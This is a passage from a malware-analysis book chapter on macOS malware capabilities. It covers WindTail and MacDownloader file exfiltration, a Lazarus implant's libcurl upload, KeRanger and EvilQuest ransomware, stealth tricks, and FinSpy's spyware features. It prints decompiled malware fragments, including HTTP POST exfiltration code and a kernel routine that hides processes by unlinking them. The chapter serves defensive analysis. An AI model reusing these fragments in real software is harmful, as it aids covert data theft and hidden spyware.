<pre><code>% <b>./netiquette -list</b><br/><br/>usrnode(4897)<br/>  127.0.0.1 -&gt; flux2key.com:80 (Established)<br/><br/>usrnode(4897)<br/>  127.0.0.1 -&gt; flux2key.com:80 (Established)</code></pre>
<p class="CodeListingCaption"><a id="listing3-13">Listing 3-13</a>: File download connections (WindTail)</p>
<p>Once WindTail has saved the downloaded file on the infected system, it unzips it, then executes it. </p>
<p>Malware may also upload files from the victim computer to the attacker’s server. Usually these uploads include information about the infected system (a survey) or user files that may be of interest to the attacker. </p>
<p>For example, earlier in this chapter I mentioned MacDownloader, which collects data about the system, such as installed applications, and saves this to disk. It then exfiltrates this survey data to the attacker’s command and control server via a method named <code>SendCollectedDataTo:withThisTargetId:</code>, which in turn invokes the <code>uploadFile:ToServer:withTargetId:</code> method (<a href="#listing3-14" id="listinganchor3-14">Listing 3-14</a>):</p>
<pre><code>-[AuthenticationController SendCollectedDataTo:withThisTargetId:](...) {<br/>   ...<br/><br/>   if (([CUtils hasInternet:0x0] &amp; 0x1 &amp; 0xff) != 0x0) { <br/>      ...<br/>      file ="[@"/tmp/applist."xt" retain];<br/>      [CUtils uploadFile:file ToServer:0x0 withTargetId:0x0]; <br/>      ...<br/>      }<br/>}</code></pre>
<p class="CodeListingCaption"><a id="listing3-14">Listing 3-14</a>: File exfiltration wrapper (MacDownloader)</p>
<p>As shown in <a href="#listing3-14">Listing 3-14</a>, the malware first invokes a method to ensure it is connected to the internet. If so, the survey file <em>applist.txt</em> will be uploaded via the <code>uploadFile:</code> method. Examining the code in this method reveals it leverages Apple’s <code>NSMutableURLRequest</code> and <code>NSURLConnection</code> class to upload the file via an HTTP <code>POST</code> request (<a href="#listing3-15" id="listinganchor3-15">Listing 3-15</a>): </p>
<pre><code>+(char)uploadFile:(void *)arg2 ToServer:(void *)arg3 withTargetId:(void *)arg4 {<br/>    ...<br/><br/>    request = [[NSMutableURLRequest requestWithURL:var_58 cachePolicy:0x0 <br/>                timeoutInterval:var_50] retain];<br/><br/>    [request setHTTPMethod:@"POST"];<br/>    [request setAllHTTPHeaderFields:var_78];<br/>    [request setHTTPBody:var_88];<br/><br/><span epub:type="pagebreak" id="Page_61" title="61"/>    rax = [NSURLConnection sendSynchronousRequest:request<br/>           returningResponse:0x0 error:&amp;var_A0];<br/>    ...<br/>}</code></pre>
<p class="CodeListingCaption"><a id="listing3-15">Listing 3-15</a>: File exfiltration (MacDownloader)</p>
<p>Of course, there are other programmatic methods to download and upload files. In various Lazarus Group malware, the <code>curl</code> library is leveraged for this purpose. For example, in one of their persistent backdoors, we find a method named <code>post</code>, which exfiltrates (posts) a file to an attacker-controlled server via the <code>curl</code> library (<a href="#listing3-16" id="listinganchor3-16">Listing 3-16</a>).</p>
<pre><code>handle = curl_easy_init(); <br/><br/>curl_easy_setopt(handle, 0x2727, ...); <br/>curl_easy_setopt(handle, 0x4e2b, ...); <br/>curl_easy_setopt(handle, 0x2711, ...); <br/>curl_easy_setopt(handle, 0x271f, postdata); <br/><br/>curl_easy_perform(handle); </code></pre>
<p class="CodeListingCaption"><a id="listing3-16">Listing 3-16</a>: The libcurl API (leveraged by a Lazarus Group implant)</p>
<p>In <a href="#listing3-16">Listing 3-16</a>, we can observe the backdoor first invoking the <code>curl_easy_init</code> function to perform initialization and return a handle for subsequent calls. Then various options are set via the <code>curl_easy_setopt</code> function. By consulting the libcurl API documentation, we can map the specified constants to human-readable values. For example, the most notable is <code>0x271f</code>. This maps to <code>CURLOPT_POSTFIELDS</code>, which sets the file data to post to the attacker’s remote server. Finally, the malware invokes the <code>curl_easy_perform</code> function to complete the <code>curl</code> library operation, which performs the file exfiltration. </p>
<p>Last, various Mac malware will exfiltrate files from an infected computer based on their file extension. For example, after scanning an infected system for files of interest by checking their file extensions, WindTail creates ZIP archives and uploads them via macOS’s built-in <code>curl</code> utility. Using a process and network monitor, we can passively observe this in action. In <span class="xref" itemid="xref_target_Chapter 7">Chapter 7</span> we’ll talk more about such methods of dynamic analysis. </p>
<h2 id="h1-501942c03-0009">File Encryption</h2>
<p class="BodyFirst"><span class="xref" itemid="xref_target_Chapter 2">Chapter 2</span> mentioned ransomware, or malware whose goal is to encrypt users’ files before demanding a ransom. Since ransomware is rather in vogue, macOS has seen an uptick of it as well. As an example, let’s look at KeRanger, the first fully functional macOS ransomware found in the wild.<sup class="endnote"><a href="#c03-endnote-10" id="c03-noteref-10">10</a></sup></p>
<p>KeRanger will connect to a remote server, expecting a response consisting of a public RSA encryption key and decryption instructions. Armed with this encryption key, it will recursively encrypt all files under <em>/Users/*</em>, as <span epub:type="pagebreak" id="Page_62" title="62"/>well as all files under<em> /Volumes</em> that match certain extensions, including <em>.doc</em>, <em>.jpg</em>, and <em>.zip</em>. This is shown in the following snippet of decompiled code from the malware’s <code>startEncrypt</code> function:</p>
<pre><code>void startEncrypt(...) {<br/>...<br/>  recursive_task("/Users", encrypt_entry, putReadme); <br/>  <br/>  recursive_task("/Volumes", check_ext_encrypt, putReadme);</code></pre>
<p>For each directory where the ransomware encrypts files, it creates a plaintext README file called <em>README_FOR_DECRYPT.txt</em> that instructs the user on how to pay the ransom and recover their files (<a href="#figure3-7" id="figureanchor3-7">Figure 3-7</a>).</p>
<figure>
<img alt="The plaintext read-me file begins, “Your computer has been locked and all your files has been encrypted with 2048-bit RSA encryption.” Instructions for decrypting follow, including a link to “decrypt 1 file for FREE to make sure decryption is working.” Following this is a statement that the user may ask any questions, but they will only answer if the user can pay. The file ends with a warning that they only accept Bitcoin, followed by links to two sites to buy Bitcoins." class="keyline" src="image_fi/501942c03/f03007_new.png"/>
<figcaption><p><a id="figure3-7">Figure 3-7</a>: Decryption instructions (KeRanger)</p></figcaption>
</figure>
<p>Unless the user pays the ransom, their files will remain locked. </p>
<p>Another example of Mac malware with ransomware capabilities is EvilQuest. On an infected system, EvilQuest searches for files that match a list of hardcoded file extensions, such as <em>.jpg</em> and <em>.txt</em>, and then encrypts them. Once all the files have been encrypted, the malware writes decryption instructions to a file named <em>READ_ME_NOW.txt</em> and reads it aloud to the user via macOS’s built-in <code>say</code> command.<em> </em></p>
<p>For a detailed history and more comprehensive technical discussion of ransomware on macOS, see my write-up “Towards Generic Ransomware Detection.”<sup class="endnote"><a href="#c03-endnote-11" id="c03-noteref-11">11</a></sup></p>
<h2 id="h1-501942c03-0010">Stealth</h2>
<p class="BodyFirst">After malware has infected a system, it generally treats stealth as paramount. (Ransomware, once it has encrypted user files, is a notable exception.) Interestingly, current Mac malware often doesn’t spend too much effort using stealth capabilities, even though detection usually is a death knell. Instead, the majority attempts to hide in plain sight by adopting filenames that masquerade as Apple or operating system components. For example, EvilQuest persists via a launch agent named <em>com.apple.questd.plist,</em> which executes a binary named <em>com.apple.questd</em>. The malware authors rightly assumed that the average Mac user would not find these files and process names suspicious. </p>
<p><span epub:type="pagebreak" id="Page_63" title="63"/>Other malware takes stealth a notch further by prefixing their malicious components with a period. For example, GMERA creates a launch agent named <em>.com.apple.upd.plist</em>. As the Finder app does not display files prefixed with a period by default, this affords the malware some additional stealth. </p>
<p>While it’s true that masquerading as an Apple component or prefixing a malicious component’s filename with a period provides some elementary stealth, these strategies also provide powerful detection heuristics. For example, the presence of a hidden process or a binary named <em>com.apple.*</em> that is not signed by Apple is almost certainly a sign of compromise. </p>
<p>FinSpy, a commercial cross-platform espionage implant, is a notable exception to the hiding-in-plain-sight technique. Uncovered in 2020 by Amnesty International, it is armed with the capability to hide processes via a kernel-level rootkit component, <em>logind.kext</em>, and it sought to remain undetected even on closely monitored systems.<sup class="endnote"><a href="#c03-endnote-12" id="c03-noteref-12">12</a></sup></p>
<p>FinSpy’s <em>kext</em> file contains a function named <code>ph_init</code>. (The <em>ph</em> likely stands for <em>processing hider</em>.) This function resolves several kernel symbols using a function named <code>ksym_resolve_symbol_by_crc32</code> (<a href="#listing3-17" id="listinganchor3-17">Listing 3-17</a>):</p>
<pre><code>void ph_init() {<br/><br/> <span aria-label="annotation1" class="CodeAnnotationCode2">1</span> *ALLPROC_ADDRESS = ksym_resolve_symbol_by_crc32(0x127a88e8); <br/><br/> <span aria-label="annotation2" class="CodeAnnotationCode2">2</span> *LCK_LCK = ksym_resolve_symbol_by_crc32(0xfef1d247); <br/>   *LCK_MTX_LOCK = ksym_resolve_symbol_by_crc32(0x392ec7ae);<br/>   *LCK_MTX_UNLOCK = ksym_resolve_symbol_by_crc32(0x2472817c);<br/><br/>   return;<br/>}</code></pre>
<p class="CodeListingCaption"><a id="listing3-17">Listing 3-17</a>: Kernel symbol resolution (FinSpy)</p>
<p>Based on variable names found within the kernel extension, it appears that this function is attempting to resolve the pointer of the kernel’s global list of process (<code>proc</code>) structures <span aria-label="annotation1" class="CodeAnnotation">1</span>, as well as various locks and mutex functions <span aria-label="annotation2" class="CodeAnnotation">2</span>. </p>
<p>In a function named <code>ph_hide</code>, the<em> kext</em> hides a process by first walking the list of <code>proc</code> structures, pointed to by <code>ALLPROC_ADDRESS</code>, and looking for the one that matches (<a href="#listing3-18" id="listinganchor3-18">Listing 3-18</a>):</p>
<pre><code>void ph_hide(int targetPID) {<br/>     <br/>    if (pid == 0x0) return;<br/>    <br/>    r15 = *ALLPROC_ADDRESS;<br/>    if (r15 == 0x0) goto return;<br/><br/>SEARCH:<br/>   rax = proc_pid(r15);<br/>   rbx = *r15;<br/>   if (rax == targetPID) goto HIDE;<br/><br/><span epub:type="pagebreak" id="Page_64" title="64"/>   r15 = rbx;<br/>   if (rbx != 0x0) goto SEARCH;<br/><br/>   return;<br/><br/>HIDE:<br/>   r14 = *(r15 + 0x8);<br/>   (*LCK_MTX_LOCK)(*LCK_LCK);<br/>   *r14 = rbx;<br/>   *(rbx + 0x8) = r14;<br/>   (*LCK_MTX_UNLOCK)(*LCK_LCK);<br/>   return;</code></pre>
<p class="CodeListingCaption"><a id="listing3-18">Listing 3-18</a>: Kernel-mode process hiding (FinSpy)</p>
<p>Note that the <code>HIDE</code> label contains code that will be executed when the target process is found. This code will remove the target process of interest by unlinking it from the process list. Once removed, the process would be hidden from various system process enumeration tools, such as Activity Monitor. It’s worth noting that, as FinSpy’s kernel extension is unsigned, it won’t run on any recent version of macOS, which enforce <em>kext </em>code-signing requirements. For more on the topic of Mac rootkits (including this well-known process-hiding technique), see “Revisiting Mac OS X Kernel Rootkits.”<sup class="endnote"><a href="#c03-endnote-13" id="c03-noteref-13">13</a></sup> </p>
<h2 id="h1-501942c03-0011">Other Capabilities</h2>
<p class="BodyFirst">Malware targeting macOS is diverse and, as such, spans the whole spectrum in terms of capabilities. We’ll wrap up this chapter by noting a few of the other capabilities found in Mac malware. </p>
<p>One notable type of Mac malware that shines in terms of its capabilities is malware designed to spy on its victims. This kind of malware is often impressively fully featured. Take, for example, FruitFly, a rather insidious macOS malware specimen that remained undetected in the wild for over a decade. In a comprehensive analysis titled “<a class="LinkURL" href="https://www.virusbulletin.com/uploads/pdf/magazine/2017/VB2017-Wardle.pdf">Offensive Malware Analysis: Dissecting OSX.FruitFly via a Custom C&amp;C Server</a>,” I detailed the malware’s rather extensive set of features and capabilities.<sup class="endnote"><a href="#c03-endnote-14" id="c03-noteref-14">14</a></sup> Beyond standard capabilities such as file download and upload and shell command execution, it can also be remotely tasked to perform actions such as capturing the contents of the victim’s screen, evaluating and executing arbitrary Perl commands, and posting synthetic mouse and keyboard events. The latter is rather unique amongst Mac malware and allowed a remote attacker to interact with the GUI of the infected system; for example, it could dismiss security alerts perhaps trigged by the malware’s other actions.</p>
<p>Another example of a Mac malware that is fully featured is Mokes. Designed as a cyberespionage implant, it supports typical capabilities, such as file downloads and command execution, but also the ability to search for and exfiltrate Office documents, capture the user’s screen, audio, and video, and monitor for removable media to scan for interesting files to <span epub:type="pagebreak" id="Page_65" title="65"/>collect. Any device infected by this sophisticated implant affords the remote attackers persistent control over the system, all while providing unfettered access to the user’s files and activities. </p>
<p>Speaking of fully featured malware, commercial malware (often referred to as <em>spyware suites</em>) frequently takes the cake. For example, aforementioned FinSpy’s macOS variant uses a modular design to provide a rather impressive list of capabilities. These include the basics, of course, such as executing shell commands, but also the following: </p>
<ul>
<li>Audio recording</li>
<li>Camera recording </li>
<li>Screen recording</li>
<li>Listing files on remote devices </li>
<li>Enumerating reachable Wi-Fi networks</li>
<li>Keystrokes recording (including virtual keyboards)</li>
<li>Recording modified, accessed, and deleted files </li>
<li>Stealing emails (from Apple Mail and Thunderbird)</li>
</ul>
<h2 id="h1-501942c03-0012">Up Next</h2>
<p class="BodyFirst">If you’re interested in delving deeper into the topics covered in the first part of this book, I’ve published an annual “Mac Malware Report” for each of the last several years. These reports cover the infection vectors, persistence mechanisms, and capabilities of all new malware for that year.<sup class="endnote"><a href="#c03-endnote-15" id="c03-noteref-15">15</a></sup> </p>
<p>In the next chapter, we’ll discuss how to effectively analyze a malicious sample, arming you with the necessary skills to become a proficient Mac malware analyst.</p>
<h2 id="h1-501942c03-0013">Endnotes</h2>
<aside class="endnote" epub:type="rearnote"><p>	<sup class="endnote"><a href="#c03-noteref-1" id="c03-endnote-1">1</a></sup>	“Ikittens: Iranian Actor Resurfaces with Malware for Mac (Macdownloader),” <em>Iran Threats</em>, February 7, 2017, <a class="LinkURL" href="https://iranthreats.github.io/resources/macdownloader-macos-malware/">https://iranthreats.github.io/resources/macdownloader-macos-malware/</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p>	<sup class="endnote"><a href="#c03-noteref-2" id="c03-endnote-2">2</a></sup>	Patrick Wardle, “Word to Your Mac: Analyzing a Malicious Word Document Targeting macOS Users,” <em>Objective-See</em>, December 5, 2018, <a class="LinkURL" href="https://objective-see.com/blog/blog_0x3A.html">https://objective-see.com/blog/blog_0x3A.html</a> and “Escaping the Microsoft Office Sandbox,”<em> Objective-See</em>, August 15, 2018, <a class="LinkURL" href="https://objective-see.com/blog/blog_0x35.html">https://objective-see.com/blog/blog_0x35.html</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p>	<sup class="endnote"><a href="#c03-noteref-3" id="c03-endnote-3">3</a></sup>	James T. Bennett and Mike Scott, “Forced to Adapt: XSLCmd Backdoor Now on OS X,” <em>Threat Research Blog</em>, September 4, 2014, <a class="LinkURL" href="https://bit.ly/337snXs">https://bit.ly/337snXs</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p>	<sup class="endnote"><a href="#c03-noteref-4" id="c03-endnote-4">4</a></sup>	Stefan Esser, “OS X 10.10 DYLD_PRINT_TO_FILE Local Privilege Escalation Vulnerability,” <em>SektionEins</em>, <a class="LinkURL" href="https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html">https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p><span epub:type="pagebreak" id="Page_66" title="66"/>	<sup class="endnote"><a href="#c03-noteref-5" id="c03-endnote-5">5</a></sup>	Thomas Reed, “DYLD_PRINT_TO_FILE exploit found in the wild,” <em>Malwarebytes Labs</em>, August 3, 2015, <a class="LinkURL" href="https://blog.malwarebytes.com/cybercrime/2015/08/dyld_print_to_file-exploit-found-in-the-wild/">https://blog.malwarebytes.com/cybercrime/2015/08/dyld_print_to_file-exploit-found-in-the-wild/</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p>	<sup class="endnote"><a href="#c03-noteref-6" id="c03-endnote-6">6</a></sup>	Nicole Fishbein and Avigayil Mechtinger, “A Storm Is Brewing: IPStorm Now Has Linux Malware,” <em>Intezer</em> blog, October 1, 2020, <a class="LinkURL" href="https://www.intezer.com/blog/research/a-storm-is-brewing-ipstorm-now-has-linux-malware/">https://www.intezer.com/blog/research/a-storm-is-brewing-ipstorm-now-has-linux-malware/</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p>	<sup class="endnote"><a href="#c03-noteref-7" id="c03-endnote-7">7</a></sup>	Ben Edelman, “How Affiliate Programs Fund Spyware,” <em>Ben Edelman</em> blog, September 14, 2005, <a class="LinkURL" href="http://www.benedelman.org/news-091405/">http://www.benedelman.org/news-091405/</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p>	<sup class="endnote"><a href="#c03-noteref-8" id="c03-endnote-8">8</a></sup>	“MinerGate console miner,” <em>MinerGate</em>, <a class="LinkURL" href="https://minergate.com/faq/how-minergate-console/">https://minergate.com/faq/how-minergate-console/</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p>	<sup class="endnote"><a href="#c03-noteref-9" id="c03-endnote-9">9</a></sup>	Patrick Wardle, “Lazarus Group Goes ‘Fileless’,” <em>Objective-See</em>, December 3, 2019, <a class="LinkURL" href="https://objective-see.com/blog/blog_0x51.html">https://objective-see.com/blog/blog_0x51.html</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p>	<sup class="endnote"><a href="#c03-noteref-10" id="c03-endnote-10">10</a></sup>	Claud Xiao, “New OS X Ransomware KeRanger Infected Transmission BitTorrent Client Installer,” <em>Unit 42</em>, March 6, 2016, <a class="LinkURL" href="https://unit42.paloaltonetworks.com/new-os-x-ransomware-keranger-infected-transmission-bittorrent-client-installer/">https://unit42.paloaltonetworks.com/new-os-x-ransomware-keranger-infected-transmission-bittorrent-client-installer/</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p>	<sup class="endnote"><a href="#c03-noteref-11" id="c03-endnote-11">11</a></sup>	Patrick Wardle, “Towards Generic Ransomware Detection,” <em>Objective-See</em>, April 20, 2016, <a class="LinkURL" href="https://objective-see.com/blog/blog_0x0F.html">https://objective-see.com/blog/blog_0x0F.html</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p>	<sup class="endnote"><a href="#c03-noteref-12" id="c03-endnote-12">12</a></sup>	“German-made FinSpy spyware found in Egypt, and Mac and Linux versions revealed,” <em>Amnesty International</em>, September 25, 2020, <a class="LinkURL" href="https://www.amnesty.org/en/latest/research/2020/09/german-made-finspy-spyware-found-in-egypt-and-mac-and-linux-versions-revealed/">https://www.amnesty.org/en/latest/research/2020/09/german-made-finspy-spyware-found-in-egypt-and-mac-and-linux-versions-revealed/</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p>	<sup class="endnote"><a href="#c03-noteref-13" id="c03-endnote-13">13</a></sup>	“Revisiting Mac OS X Kernel Rootkits,” <em>Phrack</em> 69: 7, May 6, 2016, <a class="LinkURL" href="http://phrack.org/issues/69/7.html">http://phrack.org/issues/69/7.html</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p>	<sup class="endnote"><a href="#c03-noteref-14" id="c03-endnote-14">14</a></sup>	Patrick Wardle, “Offensive Malware Analysis: Dissecting OSX/FRUITFLY.B via a Custom C&amp;C Server,” <em>Virus Bulletin</em>, October 2017, <a class="LinkURL" href="https://www.virusbulletin.com/uploads/pdf/magazine/2017/VB2017-Wardle.pdf">https://www.virusbulletin.com/uploads/pdf/magazine/2017/VB2017-Wardle.pdf</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p>	<sup class="endnote"><a href="#c03-noteref-15" id="c03-endnote-15">15</a></sup>	Mac Malware of 2016, 2017, 2018, 2019, 2020, 2021, <em>Objective-See</em>: <a class="LinkURL" href="https://objective-see.com/blog/blog_0x16.html">https://objective-see.com/blog/blog_0x16.html</a>, <a class="LinkURL" href="https://objective-see.com/blog/blog_0x25.html">https://objective-see.com/blog/blog_0x25.html</a>, <a class="LinkURL" href="https://objective-see.com/blog/blog_0x3C.html">https://objective-see.com/blog/blog_0x3C.html</a>, <a class="LinkURL" href="https://objective-see.com/blog/blog_0x53.html">https://objective-see.com/blog/blog_0x53.html</a>, <a class="LinkURL" href="https://objective-see.com/blog/blog_0x5F.html">https://objective-see.com/blog/blog_0x5F.html</a>, <a class="LinkURL" href="https://objective-see.com/blog/blog_0x6B.html">https://objective-see.com/blog/blog_0x6B.html</a>.</p></aside>
</section>
</body>
</html>